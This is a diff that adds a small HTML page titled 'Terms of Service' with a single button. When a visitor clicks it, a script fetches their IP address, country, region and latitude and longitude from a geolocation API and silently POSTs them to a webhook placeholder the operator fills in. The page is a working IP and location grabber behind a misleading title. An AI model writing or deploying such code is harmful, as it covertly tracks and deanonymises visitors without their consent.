@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Terms of Service</title>
+</head>
+<body>
+  <p>Press „here“ to get my infos (i give up)</p>
+  <button id="acceptBtn">Here</button>
+  <p id="info"></p>
+
+  <script>
+    const webhookURL = 'YOUR_WEBHOOK_URL_HERE';  // Replace with your webhook URL
+
+    document.getElementById('acceptBtn').addEventListener('click', function() {
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          const payload = {
+            ip: data.ip,
+            country: data.country_name,
+            region: data.region,
+            latitude: data.latitude,
+            longitude: data.longitude
+          };
+          document.getElementById('info').innerText = 
+            `IP: ${payload.ip}, Country: ${payload.country}, Region: ${payload.region}, Latitude: ${payload.latitude}, Longitude: ${payload.longitude}`;
+          
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(payload)
+          });
+        });
+    });
+  </script>
+</body>
+</html>
